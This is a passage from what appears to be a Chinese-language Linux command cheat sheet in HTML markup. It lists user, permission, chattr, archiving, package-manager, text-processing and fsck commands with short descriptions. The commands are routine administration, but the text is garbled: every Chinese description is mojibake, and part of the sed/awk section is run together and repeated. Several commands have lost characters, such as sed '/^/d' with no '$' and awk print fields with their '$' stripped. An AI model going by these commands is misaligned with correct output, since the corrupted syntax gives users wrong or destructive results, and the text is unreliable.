class="token function">userdel</span> -r user1 åˆ é™¤ä¸€ä¸ªç”¨æˆ· <span class="token punctuation">(</span> <span class="token string">'-r'</span> æ’é™¤ä¸»ç›®å½•<span class="token punctuation">)</span> <span class="token function">usermod</span> -c <span class="token string">"User FTP"</span> -g system -d /ftp/user1 -s /bin/nologin user1 ä¿®æ”¹ç”¨æˆ·å±æ€§ <span class="token function">passwd</span> ä¿®æ”¹å£ä»¤ <span class="token function">passwd</span> user1 ä¿®æ”¹ä¸€ä¸ªç”¨æˆ·çš„å£ä»¤ <span class="token punctuation">(</span>åªå…è®¸rootæ‰§è¡Œ<span class="token punctuation">)</span> chage -E 2005-12-31 user1 è®¾ç½®ç”¨æˆ·å£ä»¤çš„å¤±æ•ˆæœŸé™ pwck æ£€æŸ¥ <span class="token string">'/etc/passwd'</span> çš„æ–‡ä»¶æ ¼å¼å’Œè¯­æ³•ä¿®æ­£ä»¥åŠå­˜åœ¨çš„ç”¨æˆ· grpck æ£€æŸ¥ <span class="token string">'/etc/passwd'</span> çš„æ–‡ä»¶æ ¼å¼å’Œè¯­æ³•ä¿®æ­£ä»¥åŠå­˜åœ¨çš„ç¾¤ç»„ newgrp group_name ç™»é™†è¿›ä¸€ä¸ªæ–°çš„ç¾¤ç»„ä»¥æ”¹å˜æ–°åˆ›å»ºæ–‡ä»¶çš„é¢„è®¾ç¾¤ç»„</code></pre><h2 id="æ–‡ä»¶çš„æƒé™"><a href="#æ–‡ä»¶çš„æƒé™" class="headerlink" title="æ–‡ä»¶çš„æƒé™"></a>æ–‡ä»¶çš„æƒé™</h2><pre class=" language-bash"><code class="language-bash">-â€”â€”ä½¿ç”¨ <span class="token string">"+"</span> è®¾ç½®æƒé™ï¼Œä½¿ç”¨ <span class="token string">"-"</span> ç”¨äºå–æ¶ˆ <span class="token function">ls</span> -lh æ˜¾ç¤ºæƒé™ <span class="token function">ls</span> /tmp <span class="token operator">|</span> <span class="token function">pr</span> -T5 -W<span class="token variable">$COLUMNS</span> å°†ç»ˆç«¯åˆ’åˆ†æˆ5æ æ˜¾ç¤º <span class="token function">chmod</span> ugo+rwx directory1 è®¾ç½®ç›®å½•çš„æ‰€æœ‰äºº<span class="token punctuation">(</span>u<span class="token punctuation">)</span>ã€ç¾¤ç»„<span class="token punctuation">(</span>g<span class="token punctuation">)</span>ä»¥åŠå…¶ä»–äºº<span class="token punctuation">(</span>o<span class="token punctuation">)</span>ä»¥è¯»ï¼ˆr ï¼‰ã€å†™<span class="token punctuation">(</span>w<span class="token punctuation">)</span>å’Œæ‰§è¡Œ<span class="token punctuation">(</span>x<span class="token punctuation">)</span>çš„æƒé™ <span class="token function">chmod</span> go-rwx directory1 åˆ é™¤ç¾¤ç»„<span class="token punctuation">(</span>g<span class="token punctuation">)</span>ä¸å…¶ä»–äºº<span class="token punctuation">(</span>o<span class="token punctuation">)</span>å¯¹ç›®å½•çš„è¯»å†™æ‰§è¡Œæƒé™ <span class="token function">chown</span> user1 file1 æ”¹å˜ä¸€ä¸ªæ–‡ä»¶çš„æ‰€æœ‰äººå±æ€§ <span class="token function">chown</span> -R user1 directory1 æ”¹å˜ä¸€ä¸ªç›®å½•çš„æ‰€æœ‰äººå±æ€§å¹¶åŒæ—¶æ”¹å˜æ”¹ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶çš„å±æ€§ <span class="token function">chgrp</span> group1 file1 æ”¹å˜æ–‡ä»¶çš„ç¾¤ç»„ <span class="token function">chown</span> user1:group1 file1 æ”¹å˜ä¸€ä¸ªæ–‡ä»¶çš„æ‰€æœ‰äººå’Œç¾¤ç»„å±æ€§ <span class="token function">find</span> / -perm -u+s ç½—åˆ—ä¸€ä¸ªç³»ç»Ÿä¸­æ‰€æœ‰ä½¿ç”¨äº†SUIDæ§åˆ¶çš„æ–‡ä»¶ <span class="token function">chmod</span> u+s /bin/file1 è®¾ç½®ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶çš„ SUID ä½ - è¿è¡Œè¯¥æ–‡ä»¶çš„ç”¨æˆ·ä¹Ÿè¢«èµ‹äºˆå’Œæ‰€æœ‰è€…åŒæ ·çš„æƒé™ <span class="token function">chmod</span> u-s /bin/file1 ç¦ç”¨ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶çš„ SUIDä½ <span class="token function">chmod</span> g+s /home/public è®¾ç½®ä¸€ä¸ªç›®å½•çš„SGID ä½ - ç±»ä¼¼SUID ï¼Œä¸è¿‡è¿™æ˜¯é’ˆå¯¹ç›®å½•çš„ <span class="token function">chmod</span> g-s /home/public ç¦ç”¨ä¸€ä¸ªç›®å½•çš„ SGID ä½ <span class="token function">chmod</span> o+t /home/public è®¾ç½®ä¸€ä¸ªæ–‡ä»¶çš„ STIKY ä½ - åªå…è®¸åˆæ³•æ‰€æœ‰äººåˆ é™¤æ–‡ä»¶ <span class="token function">chmod</span> o-t /home/public ç¦ç”¨ä¸€ä¸ªç›®å½•çš„ STIKY ä½</code></pre><h2 id="æ–‡ä»¶çš„ç‰¹æ®Šå±æ€§"><a href="#æ–‡ä»¶çš„ç‰¹æ®Šå±æ€§" class="headerlink" title="æ–‡ä»¶çš„ç‰¹æ®Šå±æ€§"></a>æ–‡ä»¶çš„ç‰¹æ®Šå±æ€§</h2><pre class=" language-bash"><code class="language-bash">â€”â€” ä½¿ç”¨ <span class="token string">"+"</span> è®¾ç½®æƒé™ï¼Œä½¿ç”¨ <span class="token string">"-"</span> ç”¨äºå–æ¶ˆ chattr +a file1 åªå…è®¸ä»¥è¿½åŠ æ–¹å¼è¯»å†™æ–‡ä»¶ chattr +c file1 å…è®¸è¿™ä¸ªæ–‡ä»¶èƒ½è¢«å†…æ ¸è‡ªåŠ¨å‹ç¼©/è§£å‹ chattr +d file1 åœ¨è¿›è¡Œæ–‡ä»¶ç³»ç»Ÿå¤‡ä»½æ—¶ï¼Œdumpç¨‹åºå°†å¿½ç•¥è¿™ä¸ªæ–‡ä»¶ chattr +i file1 è®¾ç½®æˆä¸å¯å˜çš„æ–‡ä»¶ï¼Œä¸èƒ½è¢«åˆ é™¤ã€ä¿®æ”¹ã€é‡å‘½åæˆ–è€…é“¾æ¥ chattr +s file1 å…è®¸ä¸€ä¸ªæ–‡ä»¶è¢«å®‰å…¨åœ°åˆ é™¤ chattr +S file1 ä¸€æ—¦åº”ç”¨ç¨‹åºå¯¹è¿™ä¸ªæ–‡ä»¶æ‰§è¡Œäº†å†™æ“ä½œï¼Œä½¿ç³»ç»Ÿç«‹åˆ»æŠŠä¿®æ”¹çš„ç»“æœå†™åˆ°ç£ç›˜ chattr +u file1 è‹¥æ–‡ä»¶è¢«åˆ é™¤ï¼Œç³»ç»Ÿä¼šå…è®¸ä½ åœ¨ä»¥åæ¢å¤è¿™ä¸ªè¢«åˆ é™¤çš„æ–‡ä»¶ lsattr æ˜¾ç¤ºç‰¹æ®Šçš„å±æ€§</code></pre><h2 id="æ‰“åŒ…å’Œå‹ç¼©æ–‡ä»¶"><a href="#æ‰“åŒ…å’Œå‹ç¼©æ–‡ä»¶" class="headerlink" title="æ‰“åŒ…å’Œå‹ç¼©æ–‡ä»¶"></a>æ‰“åŒ…å’Œå‹ç¼©æ–‡ä»¶</h2><pre class=" language-bash"><code class="language-bash">bunzip2 file1.bz2 è§£å‹ä¸€ä¸ªå«åš <span class="token string">'file1.bz2'</span>çš„æ–‡ä»¶ <span class="token function">bzip2</span> file1 å‹ç¼©ä¸€ä¸ªå«åš <span class="token string">'file1'</span> çš„æ–‡ä»¶ gunzip file1.gz è§£å‹ä¸€ä¸ªå«åš <span class="token string">'file1.gz'</span>çš„æ–‡ä»¶ <span class="token function">gzip</span> file1 å‹ç¼©ä¸€ä¸ªå«åš <span class="token string">'file1'</span>çš„æ–‡ä»¶ <span class="token function">gzip</span> -9 file1 æœ€å¤§ç¨‹åº¦å‹ç¼© <span class="token function">rar</span> a file1.rar test_file åˆ›å»ºä¸€ä¸ªå«åš <span class="token string">'file1.rar'</span> çš„åŒ… <span class="token function">rar</span> a file1.rar file1 file2 dir1 åŒæ—¶å‹ç¼© <span class="token string">'file1'</span>, <span class="token string">'file2'</span> ä»¥åŠç›®å½• <span class="token string">'dir1'</span> <span class="token function">rar</span> x file1.rar è§£å‹raråŒ… <span class="token function">unrar</span> x file1.rar è§£å‹raråŒ… <span class="token function">tar</span> -cvf archive.tar file1 åˆ›å»ºä¸€ä¸ªéå‹ç¼©çš„ tarball <span class="token function">tar</span> -cvf archive.tar file1 file2 dir1 åˆ›å»ºä¸€ä¸ªåŒ…å«äº† <span class="token string">'file1'</span>, <span class="token string">'file2'</span> ä»¥åŠ <span class="token string">'dir1'</span>çš„æ¡£æ¡ˆæ–‡ä»¶ <span class="token function">tar</span> -tf archive.tar æ˜¾ç¤ºä¸€ä¸ªåŒ…ä¸­çš„å†…å®¹ <span class="token function">tar</span> -xvf archive.tar é‡Šæ”¾ä¸€ä¸ªåŒ… <span class="token function">tar</span> -xvf archive.tar -C /tmp å°†å‹ç¼©åŒ…é‡Šæ”¾åˆ° /tmpç›®å½•ä¸‹ <span class="token function">tar</span> -cvfj archive.tar.bz2 dir1 åˆ›å»ºä¸€ä¸ªbzip2æ ¼å¼çš„å‹ç¼©åŒ… <span class="token function">tar</span> -xvfj archive.tar.bz2 è§£å‹ä¸€ä¸ªbzip2æ ¼å¼çš„å‹ç¼©åŒ… <span class="token function">tar</span> -cvfz archive.tar.gz dir1 åˆ›å»ºä¸€ä¸ªgzipæ ¼å¼çš„å‹ç¼©åŒ… <span class="token function">tar</span> -xvfz archive.tar.gz è§£å‹ä¸€ä¸ªgzipæ ¼å¼çš„å‹ç¼©åŒ… <span class="token function">zip</span> file1.zip file1 åˆ›å»ºä¸€ä¸ªzipæ ¼å¼çš„å‹ç¼©åŒ… <span class="token function">zip</span> -r file1.zip file1 file2 dir1 å°†å‡ ä¸ªæ–‡ä»¶å’Œç›®å½•åŒæ—¶å‹ç¼©æˆä¸€ä¸ªzipæ ¼å¼çš„å‹ç¼©åŒ… unzip file1.zip è§£å‹ä¸€ä¸ªzipæ ¼å¼å‹ç¼©åŒ…RPM åŒ… - ï¼ˆFedora, RedhatåŠç±»ä¼¼ç³»ç»Ÿï¼‰ rpm -ivh package.rpm å®‰è£…ä¸€ä¸ªrpmåŒ… rpm -ivh --nodeeps package.rpm å®‰è£…ä¸€ä¸ªrpmåŒ…è€Œå¿½ç•¥ä¾èµ–å…³ç³»è­¦å‘Š rpm -U package.rpm æ›´æ–°ä¸€ä¸ªrpmåŒ…ä½†ä¸æ”¹å˜å…¶é…ç½®æ–‡ä»¶ rpm -F package.rpm æ›´æ–°ä¸€ä¸ªç¡®å®šå·²ç»å®‰è£…çš„rpmåŒ… rpm -e package_name.rpm åˆ é™¤ä¸€ä¸ªrpmåŒ… rpm -qa æ˜¾ç¤ºç³»ç»Ÿä¸­æ‰€æœ‰å·²ç»å®‰è£…çš„rpmåŒ… rpm -qa <span class="token operator">|</span> <span class="token function">grep</span> httpd æ˜¾ç¤ºæ‰€æœ‰åç§°ä¸­åŒ…å« <span class="token string">"httpd"</span> å­—æ ·çš„rpmåŒ… rpm -qi package_name è·å–ä¸€ä¸ªå·²å®‰è£…åŒ…çš„ç‰¹æ®Šä¿¡æ¯ rpm -qg <span class="token string">"System Environment/Daemons"</span> æ˜¾ç¤ºä¸€ä¸ªç»„ä»¶çš„rpmåŒ… rpm -ql package_name æ˜¾ç¤ºä¸€ä¸ªå·²ç»å®‰è£…çš„rpmåŒ…æä¾›çš„æ–‡ä»¶åˆ—è¡¨ rpm -qc package_name æ˜¾ç¤ºä¸€ä¸ªå·²ç»å®‰è£…çš„rpmåŒ…æä¾›çš„é…ç½®æ–‡ä»¶åˆ—è¡¨ rpm -q package_name --whatrequires æ˜¾ç¤ºä¸ä¸€ä¸ªrpmåŒ…å­˜åœ¨ä¾èµ–å…³ç³»çš„åˆ—è¡¨ rpm -q package_name --whatprovides æ˜¾ç¤ºä¸€ä¸ªrpmåŒ…æ‰€å çš„ä½“ç§¯ rpm -q package_name --**s æ˜¾ç¤ºåœ¨å®‰è£…/åˆ é™¤æœŸé—´æ‰€æ‰§è¡Œçš„è„šæœ¬l rpm -q package_name --changelog æ˜¾ç¤ºä¸€ä¸ªrpmåŒ…çš„ä¿®æ”¹å†å² rpm -qf /etc/httpd/conf/httpd.conf ç¡®è®¤æ‰€ç»™çš„æ–‡ä»¶ç”±å“ªä¸ªrpmåŒ…æ‰€æä¾› rpm -qp package.rpm -l æ˜¾ç¤ºç”±ä¸€ä¸ªå°šæœªå®‰è£…çš„rpmåŒ…æä¾›çš„æ–‡ä»¶åˆ—è¡¨ rpm --import /media/cdrom/RPM-GPG-KEY å¯¼å…¥å…¬é’¥æ•°å­—è¯ä¹¦ rpm --checksig package.rpm ç¡®è®¤ä¸€ä¸ªrpmåŒ…çš„å®Œæ•´æ€§ rpm -qa gpg-pubkey ç¡®è®¤å·²å®‰è£…çš„æ‰€æœ‰rpmåŒ…çš„å®Œæ•´æ€§ rpm -V package_name æ£€æŸ¥æ–‡ä»¶å°ºå¯¸ã€ è®¸å¯ã€ç±»å‹ã€æ‰€æœ‰è€…ã€ç¾¤ç»„ã€MD5æ£€æŸ¥ä»¥åŠæœ€åä¿®æ”¹æ—¶é—´ rpm -Va æ£€æŸ¥ç³»ç»Ÿä¸­æ‰€æœ‰å·²å®‰è£…çš„rpmåŒ…- å°å¿ƒä½¿ç”¨ rpm -Vp package.rpm ç¡®è®¤ä¸€ä¸ªrpmåŒ…è¿˜æœªå®‰è£… rpm2cpio package.rpm <span class="token operator">|</span> cpio --extract --make-directories *bin* ä»ä¸€ä¸ªrpmåŒ…è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶ rpm -ivh /usr/src/redhat/RPMS/<span class="token variable"><span class="token variable">`</span>arch<span class="token variable">`</span></span>/package.rpm ä»ä¸€ä¸ªrpmæºç å®‰è£…ä¸€ä¸ªæ„å»ºå¥½çš„åŒ… rpmbuild --rebuild package_name.src.rpm ä»ä¸€ä¸ªrpmæºç æ„å»ºä¸€ä¸ª rpm åŒ…YUM è½¯ä»¶åŒ…å‡çº§å™¨ - ï¼ˆFedora, RedHatåŠç±»ä¼¼ç³»ç»Ÿï¼‰ yum <span class="token function">install</span> package_name ä¸‹è½½å¹¶å®‰è£…ä¸€ä¸ªrpmåŒ… yum localinstall package_name.rpm å°†å®‰è£…ä¸€ä¸ªrpmåŒ…ï¼Œä½¿ç”¨ä½ è‡ªå·±çš„è½¯ä»¶ä»“åº“ä¸ºä½ è§£å†³æ‰€æœ‰ä¾èµ–å…³ç³» yum update package_name.rpm æ›´æ–°å½“å‰ç³»ç»Ÿä¸­æ‰€æœ‰å®‰è£…çš„rpmåŒ… yum update package_name æ›´æ–°ä¸€ä¸ªrpmåŒ… yum remove package_name åˆ é™¤ä¸€ä¸ªrpmåŒ… yum list åˆ—å‡ºå½“å‰ç³»ç»Ÿä¸­å®‰è£…çš„æ‰€æœ‰åŒ… yum search package_name åœ¨rpmä»“åº“ä¸­æœå¯»è½¯ä»¶åŒ… yum clean packages æ¸…ç†rpmç¼“å­˜åˆ é™¤ä¸‹è½½çš„åŒ… yum clean headers åˆ é™¤æ‰€æœ‰å¤´æ–‡ä»¶ yum clean all åˆ é™¤æ‰€æœ‰ç¼“å­˜çš„åŒ…å’Œå¤´æ–‡ä»¶DEB åŒ… <span class="token punctuation">(</span>Debian, Ubuntu ä»¥åŠç±»ä¼¼ç³»ç»Ÿ<span class="token punctuation">)</span> dpkg -i package.deb å®‰è£…/æ›´æ–°ä¸€ä¸ª deb åŒ… dpkg -r package_name ä»ç³»ç»Ÿåˆ é™¤ä¸€ä¸ª deb åŒ… dpkg -l æ˜¾ç¤ºç³»ç»Ÿä¸­æ‰€æœ‰å·²ç»å®‰è£…çš„ deb åŒ… dpkg -l <span class="token operator">|</span> <span class="token function">grep</span> httpd æ˜¾ç¤ºæ‰€æœ‰åç§°ä¸­åŒ…å« <span class="token string">"httpd"</span> å­—æ ·çš„debåŒ… dpkg -s package_name è·å¾—å·²ç»å®‰è£…åœ¨ç³»ç»Ÿä¸­ä¸€ä¸ªç‰¹æ®ŠåŒ…çš„ä¿¡æ¯ dpkg -L package_name æ˜¾ç¤ºç³»ç»Ÿä¸­å·²ç»å®‰è£…çš„ä¸€ä¸ªdebåŒ…æ‰€æä¾›çš„æ–‡ä»¶åˆ—è¡¨ dpkg --contents package.deb æ˜¾ç¤ºå°šæœªå®‰è£…çš„ä¸€ä¸ªåŒ…æ‰€æä¾›çš„æ–‡ä»¶åˆ—è¡¨ dpkg -S /bin/ping ç¡®è®¤æ‰€ç»™çš„æ–‡ä»¶ç”±å“ªä¸ªdebåŒ…æä¾›APT è½¯ä»¶å·¥å…· <span class="token punctuation">(</span>Debian, Ubuntu ä»¥åŠç±»ä¼¼ç³»ç»Ÿ<span class="token punctuation">)</span> <span class="token function">apt-get</span> <span class="token function">install</span> package_name å®‰è£…/æ›´æ–°ä¸€ä¸ª deb åŒ… apt-cdrom <span class="token function">install</span> package_name ä»å…‰ç›˜å®‰è£…/æ›´æ–°ä¸€ä¸ª deb åŒ… <span class="token function">apt-get</span> update å‡çº§åˆ—è¡¨ä¸­çš„è½¯ä»¶åŒ… <span class="token function">apt-get</span> upgrade å‡çº§æ‰€æœ‰å·²å®‰è£…çš„è½¯ä»¶ <span class="token function">apt-get</span> remove package_name ä»ç³»ç»Ÿåˆ é™¤ä¸€ä¸ªdebåŒ… <span class="token function">apt-get</span> check ç¡®è®¤ä¾èµ–çš„è½¯ä»¶ä»“åº“æ­£ç¡® <span class="token function">apt-get</span> clean ä»ä¸‹è½½çš„è½¯ä»¶åŒ…ä¸­æ¸…ç†ç¼“å­˜ apt-cache search searched-package è¿”å›åŒ…å«æ‰€è¦æœç´¢å­—ç¬¦ä¸²çš„è½¯ä»¶åŒ…åç§°è¿”å›é¡¶éƒ¨ç´¢å¼• ^æŸ¥çœ‹æ–‡ä»¶å†…å®¹ <span class="token function">cat</span> file1 ä»ç¬¬ä¸€ä¸ªå­—èŠ‚å¼€å§‹æ­£å‘æŸ¥çœ‹æ–‡ä»¶çš„å†…å®¹ tac file1 ä»æœ€åä¸€è¡Œå¼€å§‹åå‘æŸ¥çœ‹ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹ <span class="token function">more</span> file1 æŸ¥çœ‹ä¸€ä¸ªé•¿æ–‡ä»¶çš„å†…å®¹ <span class="token function">less</span> file1 ç±»ä¼¼äº <span class="token string">'more'</span> å‘½ä»¤ï¼Œä½†æ˜¯å®ƒå…è®¸åœ¨æ–‡ä»¶ä¸­å’Œæ­£å‘æ“ä½œä¸€æ ·çš„åå‘æ“ä½œ <span class="token function">head</span> -2 file1 æŸ¥çœ‹ä¸€ä¸ªæ–‡ä»¶çš„å‰ä¸¤è¡Œ <span class="token function">tail</span> -2 file1 æŸ¥çœ‹ä¸€ä¸ªæ–‡ä»¶çš„æœ€åä¸¤è¡Œ <span class="token function">tail</span> -f /var/log/messages å®æ—¶æŸ¥çœ‹è¢«æ·»åŠ åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­çš„å†…å®¹</code></pre><h2 id="æ–‡æœ¬å¤„ç†"><a href="#æ–‡æœ¬å¤„ç†" class="headerlink" title="æ–‡æœ¬å¤„ç†"></a>æ–‡æœ¬å¤„ç†</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">cat</span> file1 file2 <span class="token punctuation">..</span>. <span class="token operator">|</span> <span class="token function">command</span> <span class="token operator">&lt;</span><span class="token operator">></span> file1_in.txt_or_file1_out.txt general syntax <span class="token keyword">for</span> text manipulation using PIPE, STDIN and STDOUT <span class="token function">cat</span> file1 <span class="token operator">|</span> command<span class="token punctuation">(</span> sed, grep, awk, grep, etc<span class="token punctuation">..</span>.<span class="token punctuation">)</span> <span class="token operator">></span> result.txt åˆå¹¶ä¸€ä¸ªæ–‡ä»¶çš„è¯¦ç»†è¯´æ˜æ–‡æœ¬ï¼Œå¹¶å°†ç®€ä»‹å†™å…¥ä¸€ä¸ªæ–°æ–‡ä»¶ä¸­ <span class="token function">cat</span> file1 <span class="token operator">|</span> command<span class="token punctuation">(</span> sed, grep, awk, grep, etc<span class="token punctuation">..</span>.<span class="token punctuation">)</span> <span class="token operator">>></span> result.txt åˆå¹¶ä¸€ä¸ªæ–‡ä»¶çš„è¯¦ç»†è¯´æ˜æ–‡æœ¬ï¼Œå¹¶å°†ç®€ä»‹å†™å…¥ä¸€ä¸ªå·²æœ‰çš„æ–‡ä»¶ä¸­ <span class="token function">grep</span> Aug /var/log/messages åœ¨æ–‡ä»¶ <span class="token string">'/var/log/messages'</span>ä¸­æŸ¥æ‰¾å…³é”®è¯<span class="token string">"Aug"</span> <span class="token function">grep</span> ^Aug /var/log/messages åœ¨æ–‡ä»¶ <span class="token string">'/var/log/messages'</span>ä¸­æŸ¥æ‰¾ä»¥<span class="token string">"Aug"</span>å¼€å§‹çš„è¯æ±‡ <span class="token function">grep</span> <span class="token punctuation">[</span>0-9<span class="token punctuation">]</span> /var/log/messages é€‰æ‹© <span class="token string">'/var/log/messages'</span> æ–‡ä»¶ä¸­æ‰€æœ‰åŒ…å«æ•°å­—çš„è¡Œ <span class="token function">grep</span> Aug -R /var/log/* åœ¨ç›®å½• <span class="token string">'/var/log'</span> åŠéšåçš„ç›®å½•ä¸­æœç´¢å­—ç¬¦ä¸²<span class="token string">"Aug"</span> <span class="token function">sed</span> <span class="token string">'s/stringa1/stringa2/g'</span> example.txt å°†example.txtæ–‡ä»¶ä¸­çš„ <span class="token string">"string1"</span> æ›¿æ¢æˆ <span class="token string">"string2"</span> <span class="token function">sed</span> <span class="token string">'/^/d'</span> example.txt ä»example.txtæ–‡ä»¶ä¸­åˆ é™¤æ‰€æœ‰ç©ºç™½è¡Œ  <span class="token function">sed</span> <span class="token string">'/ *#/d; /^/d'</span> example.txt ä»example.txtæ–‡ä»¶ä¸­åˆ é™¤æ‰€æœ‰ç©ºç™½è¡Œ  <span class="token function">sed</span> <span class="token string">'/ *#/d; /^/d'</span> example.txt ä»example.txtæ–‡ä»¶ä¸­åˆ é™¤æ‰€æœ‰æ³¨é‡Šå’Œç©ºç™½è¡Œ <span class="token keyword">echo</span> <span class="token string">'esempio'</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token string">'[:lower:]'</span> <span class="token string">'[:upper:]'</span> åˆå¹¶ä¸Šä¸‹å•å…ƒæ ¼å†…å®¹ <span class="token function">sed</span> -e <span class="token string">'1d'</span> result.txt ä»æ–‡ä»¶example.txt ä¸­æ’é™¤ç¬¬ä¸€è¡Œ <span class="token function">sed</span> -n <span class="token string">'/stringa1/p'</span> æŸ¥çœ‹åªåŒ…å«è¯æ±‡ <span class="token string">"string1"</span>çš„è¡Œ <span class="token function">sed</span> -e <span class="token string">'s/ *//â€²example.txtåˆ é™¤æ¯ä¸€è¡Œæœ€åçš„ç©ºç™½å­—ç¬¦sedâˆ’eâ€²s/stringa1//gâ€²example.txtä»æ–‡æ¡£ä¸­åªåˆ é™¤è¯æ±‡"string1"å¹¶ä¿ç•™å‰©ä½™å…¨éƒ¨sedâˆ’nâ€²1,5p;5qâ€²example.txtæŸ¥çœ‹ä»ç¬¬ä¸€è¡Œåˆ°ç¬¬5è¡Œå†…å®¹sedâˆ’nâ€²5p;5qâ€²example.txtæŸ¥çœ‹ç¬¬5è¡Œsedâˆ’eâ€²s/00âˆ—/0/gâ€²example.txtç”¨å•ä¸ªé›¶æ›¿æ¢å¤šä¸ªé›¶catâˆ’nfile1æ ‡ç¤ºæ–‡ä»¶çš„è¡Œæ•°catexample.txt|awkâ€²NR//â€²example.txtåˆ é™¤æ¯ä¸€è¡Œæœ€åçš„ç©ºç™½å­—ç¬¦sedâˆ’eâ€²s/stringa1//gâ€²example.txtä»æ–‡æ¡£ä¸­åªåˆ é™¤è¯æ±‡"string1"å¹¶ä¿ç•™å‰©ä½™å…¨éƒ¨sedâˆ’nâ€²1,5p;5qâ€²example.txtæŸ¥çœ‹ä»ç¬¬ä¸€è¡Œåˆ°ç¬¬5è¡Œå†…å®¹sedâˆ’nâ€²5p;5qâ€²example.txtæŸ¥çœ‹ç¬¬5è¡Œsedâˆ’eâ€²s/00âˆ—/0/gâ€²example.txtç”¨å•ä¸ªé›¶æ›¿æ¢å¤šä¸ªé›¶catâˆ’nfile1æ ‡ç¤ºæ–‡ä»¶çš„è¡Œæ•°catexample.txt|awkâ€²NR1}'</span> æŸ¥çœ‹ä¸€è¡Œç¬¬ä¸€æ  <span class="token keyword">echo</span> a b c <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print 1,1,3}'</span> æŸ¥çœ‹ä¸€è¡Œçš„ç¬¬ä¸€å’Œç¬¬ä¸‰æ  <span class="token function">paste</span> file1 file2 åˆå¹¶ä¸¤ä¸ªæ–‡ä»¶æˆ–ä¸¤æ çš„å†…å®¹ <span class="token function">paste</span> -d <span class="token string">'+'</span> file1 file2 åˆå¹¶ä¸¤ä¸ªæ–‡ä»¶æˆ–ä¸¤æ çš„å†…å®¹ï¼Œä¸­é—´ç”¨<span class="token string">"+"</span>åŒºåˆ† <span class="token function">sort</span> file1 file2 æ’åºä¸¤ä¸ªæ–‡ä»¶çš„å†…å®¹ <span class="token function">sort</span> file1 file2 <span class="token operator">|</span> <span class="token function">uniq</span> å–å‡ºä¸¤ä¸ªæ–‡ä»¶çš„å¹¶é›†<span class="token punctuation">(</span>é‡å¤çš„è¡Œåªä¿ç•™ä¸€ä»½<span class="token punctuation">)</span> <span class="token function">sort</span> file1 file2 <span class="token operator">|</span> <span class="token function">uniq</span> -u åˆ é™¤äº¤é›†ï¼Œç•™ä¸‹å…¶ä»–çš„è¡Œ <span class="token function">sort</span> file1 file2 <span class="token operator">|</span> <span class="token function">uniq</span> -d å–å‡ºä¸¤ä¸ªæ–‡ä»¶çš„äº¤é›†<span class="token punctuation">(</span>åªç•™ä¸‹åŒæ—¶å­˜åœ¨äºä¸¤ä¸ªæ–‡ä»¶ä¸­çš„æ–‡ä»¶<span class="token punctuation">)</span> <span class="token function">comm</span> -1 file1 file2 æ¯”è¾ƒä¸¤ä¸ªæ–‡ä»¶çš„å†…å®¹åªåˆ é™¤ <span class="token string">'file1'</span> æ‰€åŒ…å«çš„å†…å®¹ <span class="token function">comm</span> -2 file1 file2 æ¯”è¾ƒä¸¤ä¸ªæ–‡ä»¶çš„å†…å®¹åªåˆ é™¤ <span class="token string">'file2'</span> æ‰€åŒ…å«çš„å†…å®¹ <span class="token function">comm</span> -3 file1 file2 æ¯”è¾ƒä¸¤ä¸ªæ–‡ä»¶çš„å†…å®¹åªåˆ é™¤ä¸¤ä¸ªæ–‡ä»¶å…±æœ‰çš„éƒ¨åˆ†</code></pre><h2 id="å­—ç¬¦è®¾ç½®å’Œæ–‡ä»¶æ ¼å¼è½¬æ¢"><a href="#å­—ç¬¦è®¾ç½®å’Œæ–‡ä»¶æ ¼å¼è½¬æ¢" class="headerlink" title="å­—ç¬¦è®¾ç½®å’Œæ–‡ä»¶æ ¼å¼è½¬æ¢"></a>å­—ç¬¦è®¾ç½®å’Œæ–‡ä»¶æ ¼å¼è½¬æ¢</h2><pre class=" language-bash"><code class="language-bash">dos2unix filedos.txt fileunix.txt å°†ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶çš„æ ¼å¼ä»MSDOSè½¬æ¢æˆUNIX unix2dos fileunix.txt filedos.txt å°†ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶çš„æ ¼å¼ä»UNIXè½¬æ¢æˆMSDOS recode <span class="token punctuation">..</span>HTML <span class="token operator">&lt;</span> page.txt <span class="token operator">></span> page.html å°†ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶è½¬æ¢æˆhtml recode -l <span class="token operator">|</span> <span class="token function">more</span> æ˜¾ç¤ºæ‰€æœ‰å…è®¸çš„è½¬æ¢æ ¼å¼</code></pre><h2 id="æ–‡ä»¶ç³»ç»Ÿåˆ†æ"><a href="#æ–‡ä»¶ç³»ç»Ÿåˆ†æ" class="headerlink" title="æ–‡ä»¶ç³»ç»Ÿåˆ†æ"></a>æ–‡ä»¶ç³»ç»Ÿåˆ†æ</h2><pre class=" language-bash"><code class="language-bash">badblocks -v /dev/hda1 æ£€æŸ¥ç£ç›˜hda1ä¸Šçš„åç£å— <span class="token function">fsck</span> /dev/hda1 ä¿®å¤/æ£€æŸ¥hda1ç£ç›˜ä¸Šlinuxæ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´æ€§ fsck.ext2 /dev/hda1 ä¿®å¤/æ£€æŸ¥hda1ç£ç›˜ä¸Šext2æ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´æ€§ e2fsck /dev/hda1 ä¿®å¤/æ£€æŸ¥hda1ç£ç›˜ä¸Šext2æ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´æ€§ e2fsck -j /dev/hda1 ä¿®å¤/æ£€æŸ¥hda1ç£ç›˜ä¸Šext3æ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´æ€§ fsck.ext3 /dev/hda1 ä¿®å¤/æ£€æŸ¥hda1ç£ç›˜ä¸Šext3æ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´æ€§ fsck.vfat /dev/hda1 ä¿®å¤/æ£€æŸ¥hda1ç£ç›˜ä¸Šfatæ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´æ€§ fsck.msdos /dev/hda1 ä¿®å¤/æ£€æŸ¥hda1ç£ç›˜ä¸Šdosæ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´æ€§ dosfsck /dev/hda1 